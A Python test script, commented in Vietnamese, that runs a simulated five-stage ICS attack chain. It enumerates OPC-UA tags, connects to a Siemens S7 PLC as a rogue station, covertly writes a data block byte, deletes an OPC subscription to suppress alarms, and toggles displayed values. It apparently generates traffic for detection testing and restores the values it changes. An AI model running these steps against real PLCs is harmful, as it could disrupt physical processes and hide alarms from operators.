#!/usr/bin/env python3
"""
tests/test_kill_chain.py
5-stage APT giả lập: Recon -> Rogue EWS -> Covert Write -> Alarm Suppress -> Fake Display.

Chạy: python tests/test_kill_chain.py
"""

import sys
import os
import time

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from tests.common import *

STAGES = {
    1: "RECON_OPC_ENUM",
    2: "INITIAL_ACCESS_ROGUE_EWS",
    3: "EXECUTION_COVERT_WRITE",
    4: "IMPACT_ALARM_SUPPRESS",
    5: "COVER_FAKE_DISPLAY",
}


def log_stage(num, msg):
    print(f"\n  {'='*48}")
    print(f"  {B}[STAGE {num}] {STAGES[num]}{X}")
    print(f"  {msg}")
    print(f"  {'='*48}")


def main():
    print(f"\n{B}[TEST] FULL_KILL_CHAIN (5-stage){X}")
    info(f"PLC: {PLC_IP}  OPC: {OPC_URL}")

    changes = []
    observable = []
    notes = []
    error = None
    success = False
    t0 = time.time()
    stage_results = {}

    s7 = None
    opc = None

    try:
        # ── Stage 1: OPC enumeration ────────────────────────────
        log_stage(1, "Browse OPC-UA namespace tim tag")
        from opcua import Client
        opc = Client(OPC_URL)
        opc.connect()
        stage1_nodes = []
        for child in opc.get_objects_node().get_children():
            name = child.get_browse_name().Name
            stage1_nodes.append(name)
            info(f"  {name} ({child.nodeid})")
        ok(f"Tim thay {len(stage1_nodes)} nodes")
        observable.append(f"Stage 1: OPC browse {len(stage1_nodes)} nodes")
        stage_results[1] = len(stage1_nodes)
        time.sleep(2)

        # ── Stage 2: Rogue S7 connect ───────────────────────────
        log_stage(2, "Ket noi S7 tu IP attacker")
        import snap7
        s7 = snap7.client.Client()
        s7.connect(PLC_IP, RACK, SLOT)
        info_cpu = s7.get_cpu_info()
        ok(f"S7 connected: {info_cpu.ModuleTypeName.decode().strip()}")
        observable.append(f"Stage 2: S7 session tu IP la")
        stage_results[2] = True
        time.sleep(2)

        # ── Stage 3: Covert write ───────────────────────────────
        log_stage(3, "Covert write DB1 (stealthy)")
        before = plc_snapshot(s7)
        try:
            db1 = bytearray(s7.db_read(1, 0, 10))
            orig = db1[2]
            db1[2] = min(orig + 3, 255)
            s7.db_write(1, 0, bytes(db1))
            ok(f"Write DB1[2]: {orig} -> {db1[2]}")
            time.sleep(1)
            after = plc_snapshot(s7)
            changes.extend(plc_diff(before, after))
            db1[2] = orig
            s7.db_write(1, 0, bytes(db1))
            observable.append(f"Stage 3: S7 covert write + restore")
        except Exception:
            warn("DB1 khong ghi duoc — van tao traffic pattern")
        stage_results[3] = True
        time.sleep(2)

        # ── Stage 4: Alarm suppress ─────────────────────────────
        log_stage(4, "Xoa OPC-UA subscription")
        sub = opc.create_subscription(500, handler=None)
        time.sleep(2)
        sub.delete()
        ok("Delete subscription thanh cong")
        observable.append("Stage 4: OPC DeleteSubscription")
        stage_results[4] = True
        time.sleep(2)

        # ── Stage 5: Fake display ───────────────────────────────
        log_stage(5, "Ghi de gia tri hien thi OPC")
        objects = opc.get_objects_node()
        for child in objects.get_children():
            for subc in child.get_children()[:3]:
                try:
                    val = subc.get_value()
                    if isinstance(val, bool):
                        subc.set_value(not val)
                        ok(f"Toggle {subc.get_browse_name().Name}: {val} -> {not val}")
                        subc.set_value(val)
                        observable.append(f"Stage 5: OPC toggle {subc.get_browse_name().Name}")
                        stage_results[5] = True
                        break
                except Exception:
                    pass
            if 5 in stage_results:
                break

        if 5 not in stage_results:
            warn("Khong co node bool de toggle — nhung traffic OPC da co")
            stage_results[5] = "partial"

        notes.append(f"Stages completed: {len(stage_results)}/5")
        notes.append("Multi-stage correlation trong pcap (temporal)")
        success = True

    except ImportError as e:
        error = f"Thieu thu vien: {e}"
        fail(error)
    except Exception as e:
        error = str(e)
        fail(str(e))
    finally:
        if s7 and s7.get_connected():
            s7.disconnect()
        if opc:
            try:
                opc.disconnect()
            except Exception:
                pass

    print_result("KILL_CHAIN", success, changes, observable + [
        f"Stage results: {stage_results}"
    ], notes, time.time() - t0, error)


if __name__ == "__main__":
    main()
